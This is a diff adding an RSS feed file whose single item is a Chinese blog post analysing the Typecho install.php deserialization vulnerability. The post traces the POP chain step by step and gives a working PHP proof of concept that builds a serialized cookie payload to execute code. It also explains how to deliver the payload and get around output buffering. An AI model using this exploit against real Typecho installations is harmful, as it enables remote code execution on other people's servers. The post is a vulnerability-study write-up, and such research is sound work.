@@ -1,0 +1,144 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>反序列化 on 诗与胡说</title>
+    <link>https://kylingit.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml</link>
+    <description>Recent content in 反序列化 on 诗与胡说</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh_cn</language>
+    <copyright>Copyright © 2018 kylinking</copyright>
+    <atom:link href="https://kylingit.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Typecho install.php 反序列化漏洞分析</title>
+      <link>https://kylingit.com/blog/typecho-install.php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Mon, 30 Oct 2017 14:32:18 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/typecho-install.php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;正好在学习php代码审计，简单分析一下前几天的&lt;code&gt;Typecho install.php&lt;/code&gt;反序列化漏洞&lt;/p&gt;
+
+&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;漏洞点出现在&lt;code&gt;install.php&lt;/code&gt;第229-235行:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Affah&#34; alt=&#34;0&#34; /&gt;
+这里进行了一个反序列化操作，一般碰到这个都值得注意一下&lt;/p&gt;
+
+&lt;p&gt;由于这是初始安装文件，复现时要想流程走到这里就得绕过程序自身的判断，它的判断逻辑如下:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fQO9b&#34; alt=&#34;1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;就进行了两个简单的判断，&lt;code&gt;HTTP_REFERER&lt;/code&gt;是否为空以及是否来源于本站，这是很容易绕过的&lt;/p&gt;
+
+&lt;p&gt;往下执行到&lt;code&gt;unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)))&lt;/code&gt;反序列化操作，如果&lt;code&gt;Typecho_Cookie::get(&#39;__typecho_config&#39;)&lt;/code&gt;可控的话就可能导致一个漏洞&lt;/p&gt;
+
+&lt;p&gt;跟进&lt;code&gt;Typecho_Cookie&lt;/code&gt;类的&lt;code&gt;get()&lt;/code&gt;方法分析一下:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/HW0eV&#34; alt=&#34;2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;$_COOKIE[$key]&lt;/code&gt;的内容都是我们可以控制的，存在风险&lt;/p&gt;
+
+&lt;p&gt;继续往下看到
+&lt;code&gt;$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);&lt;/code&gt;这里新建了一个&lt;code&gt;Typecho_Db&lt;/code&gt;对象，跟进去看一下这个对象的构造方法:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/yLOrO&#34; alt=&#34;3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意这一行&lt;code&gt;$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;&lt;/code&gt;
+将&lt;code&gt;Typecho_Db_Adapter_&lt;/code&gt;属性与字符串进行了拼接，这就涉及到php的一个特性，如果&lt;code&gt;Typecho_Db_Adapter_&lt;/code&gt;传入的是一个实例化对象，那将自动触发这个对象的&lt;code&gt;__toString()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;我们全局搜索&lt;code&gt;__toString()&lt;/code&gt;方法，可以在&lt;code&gt;Feed.php&lt;/code&gt;的第223行找到一个&lt;code&gt;__toString()&lt;/code&gt;方法:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/nXTJN&#34; alt=&#34;4&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;里面进行了3个&lt;code&gt;if&lt;/code&gt;判断，注意到第3个&lt;code&gt;if&lt;/code&gt;中有这样一句(同样在第2个&lt;code&gt;if&lt;/code&gt;中也存在):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/11MHn&#34; alt=&#34;5&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;访问了&lt;code&gt;item&lt;/code&gt;元素里的一个属性&lt;code&gt;screenName&lt;/code&gt;，这就又涉及到php的一个特性，如果我们访问一个对象的私有属性或者不存在的属性到时候，会自动调用这个对象的&lt;code&gt;__get()&lt;/code&gt;方法，所以我们只要找到一个&lt;code&gt;__get()&lt;/code&gt;方法并且它的参数可控，那就形成了一条完整的调用链。&lt;/p&gt;
+
+&lt;p&gt;全局搜索&lt;code&gt;__get()&lt;/code&gt;方法，在&lt;code&gt;Request.php&lt;/code&gt;第269行:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/zcYKG&#34; alt=&#34;6&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续跟进&lt;code&gt;get&lt;/code&gt;，第295行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/EbE9r&#34; alt=&#34;7&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到自定义的&lt;code&gt;get()&lt;/code&gt;方法最终返回的是&lt;code&gt;$this-&amp;gt;_applyFilter($value)&lt;/code&gt;，跟进&lt;code&gt;_applyFilter()&lt;/code&gt;看一下:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/tztDS&#34; alt=&#34;8&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意这里调用了&lt;code&gt;call_user_func()&lt;/code&gt;方法，而且这里的两个参数都是可控的，这就形成了一个任意代码执行的漏洞&lt;/p&gt;
+
+&lt;p&gt;反过来回顾一下整个流程，构造&lt;code&gt;call_user_func()&lt;/code&gt;恶意方法——调用&lt;code&gt;__get()&lt;/code&gt;方法——调用&lt;code&gt;__toString()&lt;/code&gt;方法——控制传入的类——反序列化&lt;/p&gt;
+
+&lt;h3 id=&#34;poc&#34;&gt;PoC&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class Typecho_Feed
+{
+    const ATOM1 = &#39;ATOM 1.0&#39;;
+    private $_type;
+    private $_items;
+	
+    public function __construct(){
+        $this-&amp;gt;_type = $this::ATOM1;
+        $this-&amp;gt;_items[0] = array(
+            &#39;author&#39; =&amp;gt; new Typecho_Request(),
+        );
+    }
+}
+class Typecho_Request
+{
+    private $_params = array();
+    private $_filter = array();
+    public function __construct(){
+        $this-&amp;gt;_params[&#39;screenName&#39;] = &#39;phpinfo()&#39;;
+        $this-&amp;gt;_filter[0] = &#39;assert&#39;;
+    }
+}
+$exp = array(
+    &#39;adapter&#39; =&amp;gt; new Typecho_Feed(),
+    &#39;prefix&#39; =&amp;gt; &#39;test&#39;
+);
+echo base64_encode(serialize($exp));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;构造&lt;code&gt;__typecho_config&lt;/code&gt;的值等于PoC输出内容，加上&lt;code&gt;referer&lt;/code&gt;头信息，发送给&lt;code&gt;http://localhost/install.php?finish=1&lt;/code&gt;
+PoC执行流程: base64编码后的序列化内容经过解码后反序列化，传给&lt;code&gt;Typecho_Db&lt;/code&gt;构造函数，其中&lt;code&gt;adapter&lt;/code&gt;参数是一个&lt;code&gt;Typecho_Feed&lt;/code&gt;对象，拼接了字符串会调用&lt;code&gt;__toString()&lt;/code&gt;方法，控制可控变量进入第2个if分支，执行到&lt;code&gt;$item[&#39;author&#39;]-&amp;gt;screenName&lt;/code&gt;，当&lt;code&gt;author&lt;/code&gt;是一个&lt;code&gt;Typecho_Request&lt;/code&gt;对象且没有&lt;code&gt;screenName&lt;/code&gt;属性时，会调用&lt;code&gt;__get()&lt;/code&gt;方法执行&lt;code&gt;_applyFilter()&lt;/code&gt;，进而执行&lt;code&gt;call_user_func&lt;/code&gt;，传入&lt;code&gt;assert(phpinfo());&lt;/code&gt;执行成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Ple7u&#34; alt=&#34;9&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最后还有一个&lt;code&gt;ob_start()&lt;/code&gt;的问题，&lt;code&gt;install.php&lt;/code&gt;中开启了这个，&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;所以会触发异常后导致500，同时输出内容会在缓冲区会清除，@&lt;a href=&#34;https://lorexxar.cn/&#34;&gt;LoRexxar&amp;rsquo;&lt;/a&gt;给出了两个解决办法&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;1、因为&lt;code&gt;call_user_func&lt;/code&gt;函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit 跳出，缓冲区中的数据就会被输出出来。&lt;/p&gt;
+
+&lt;p&gt;2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;总的来看这个漏洞还是比较经典的，涉及到几个特性和两三层的调用链，至于流传的“后门”说法还是持保留态度，我们还是回归到技术交流本身吧~&lt;/p&gt;
+
+&lt;p&gt;参考:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/424/&#34;&gt;Typecho 前台 getshell 漏洞分析&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.blogsir.com.cn/safe/452.html&#34;&gt;POP链和序列化，反序列化操作&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
